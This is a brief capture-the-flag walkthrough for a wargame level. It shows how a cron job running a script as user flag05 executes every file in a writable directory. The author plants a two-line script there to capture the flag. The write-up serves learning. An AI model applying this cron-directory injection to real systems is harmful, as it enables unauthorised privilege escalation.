By logging in with the user level05 i received a message : "You have a new mail."

I then use the command find , to search every file/dir with the name mail/level05/flag05
At /var/mail/level05 i found a crontab file :

	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

This is running the command "sh /usr/sbin/openarenaserver" every 2 minutes with the user flag05.

At /usr/sbin/openarenaserver i found this script :

	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done

It runs every program at /opt/openarenaserver and remove them;

I then created a script at /opt/openarenaserver/test :

	#!/bin/sh
	getflag > /tmp/flag

Waited 2 minute and fetched the flag at /tmp/flag
